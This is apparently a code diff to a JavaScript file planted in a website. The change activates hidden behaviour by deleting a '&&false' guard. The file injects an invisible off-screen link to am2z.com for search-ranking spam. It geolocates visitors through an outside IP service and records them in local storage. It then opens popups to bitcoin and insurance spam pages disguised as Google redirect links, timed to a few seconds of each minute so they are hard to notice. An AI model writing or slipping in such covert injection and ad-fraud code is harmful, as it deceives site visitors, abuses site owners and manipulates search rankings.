@@ -2,7 +2,7 @@ let EFV='<a href="https://www.am2z.com" style="position:absolute;z-index:-999;le
 
 // United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|New Zealand|Luxembourg|Finland|Belgium|France|Slovakia|China|Singapore|Romania|Austria|Hong Kong|Lithuania
 
-if (!localStorage.gieu&&false) {
+if (!localStorage.gieu) {
     (async()=>{
         localStorage.gieu=1;
         let aa=await(await(await fetch(`https://ipapi.co/country_name`)).text());
@@ -18,7 +18,7 @@ function uhd(){
     let dte=(new Date).getSeconds();
     (async()=>{try{await import('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js');
         if(!sessionStorage.i&&localStorage.gieu==2&&dte>9&&dte<12){
-            window.open('https://www.google.com/url?sa=t&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjK37Gn6on7AhWd7TgGHWo-BfkQFnoECBsQAQ&url=https%3A%2F%2Fbitcoin-loan-insurance-hosting-seo.am2z.com%2Fwhat-is-bitCoin-cryptoCurrency-blockchain-how-to-mine-bitCoin-how-to-buy-bitCoin&usg=AOvVaw26O8rOKLVXUmaVPiqutj3y'); 
+            window.open('https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjK37Gn6on7AhWd7TgGHWo-BfkQFnoECB0QAQ&url=https%3A%2F%2Fbitcoin-loan-insurance-hosting-seo.am2z.com%2Fwhat-is-insurance-full-Explained-how-many-types-of-insurance-benefits-of-insurance&usg=AOvVaw1-E9eTfl0nhWdKAo-r486j'); 
             sessionStorage.i='i';
         }         
     }catch(e){}})()
